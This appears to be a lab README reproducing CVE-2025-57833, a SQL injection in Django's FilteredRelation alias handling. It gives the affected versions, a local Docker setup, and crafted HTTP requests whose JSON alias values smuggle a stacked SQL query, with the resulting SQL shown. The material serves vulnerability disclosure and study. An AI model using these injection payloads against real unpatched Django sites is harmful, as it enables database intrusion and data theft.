# Django FilteredRelation Alias SQL Injection Vulnerability(CVE-2025-57833)
[中文版本(Chinese version)](README.zh-cn.md)

A new SQL injection vulnerability has been disclosed in Django after one
year. At first glance, the issue appears to be caused by alias handling
(**since aliases cannot be parameterized**).

This vulnerability affects Django's `FilteredRelation` feature. When
using the `QuerySet.annotate()` or `QuerySet.alias()` methods and
supplying column aliases through Python's dictionary expansion
(\*\*kwargs), an SQL injection risk arises. The dictionary keys (i.e.,
column aliases) are not sufficiently validated, allowing attackers to
craft malicious keys that inject arbitrary SQL code.

## Affected Versions

-   Django 4.2 before 4.2.24
-   Django 5.1 before 5.1.12
-   Django 5.2 before 5.2.6

---

## Environment Setup

Run the following command to start the vulnerable environment:

``` bash
docker compose up -d
```

After the server starts, visit:

http://localhost:8085

---

## Vulnerability Reproduction

Access the `/book/search` endpoint normally:

``` http
POST /book/search HTTP/1.1
Host: localhost:8085
Content-Type: application/json

{"alias":"XXX","author":"Bob"}
```

![](./img/image0.png)

Django ORM generates the following SQL:

``` sql
SELECT "vuln_book"."id", "vuln_book"."title", "vuln_book"."author_id" FROM "vuln_book" INNER JOIN "vuln_author" XXX ON ("vuln_book"."author_id" = XXX."id" AND (XXX."name" = Bob)) WHERE XXX."id" > 0
```

It is clear that the alias `XXX` is used for the `vuln_author` table.
Since Django does not sanitize this alias, SQL injection becomes
possible.

A straightforward stacked query injection fails because the first SQL
statement is invalid and prevents execution of the second one:

``` http
POST /book/search HTTP/1.1
Host: localhost:8085
Content-Type: application/json

{"alias":"XXX;select user --","author":"Bob"}
```

![](./img/image1.png)

To make the injection work, the first SQL statement must remain valid.
Since this is a join relation, we can use the `USING` syntax:

``` http
POST /book/search HTTP/1.1
Host: localhost:8085
Content-Type: application/json

{"alias":" using(id);select user --","author":"Bob"}
```

![](./img/image2.png)

The injection succeeds, and the database execution user (`postgres`) is
retrieved. The ORM-generated SQL becomes:

``` sql
SELECT "vuln_book"."id", "vuln_book"."title", "vuln_book"."author_id" FROM "vuln_book" INNER JOIN "vuln_author"  using(id);select user -- ON ("vuln_book"."author_id" =  using(id);select user --."id" AND ( using(id);select user --."name" = Bob)) WHERE  using(id);select user --."id" > 0
```

------------------------------------------------------------------------

## References

-   https://xz.aliyun.com/news/19236
-   https://mp.weixin.qq.com/s/e2FgAk2odugNH9K8_kDsAg
-   https://nvd.nist.gov/vuln/detail/CVE-2025-57833
-   https://docs.djangoproject.com/en/dev/releases/security
-   https://groups.google.com/g/django-announce
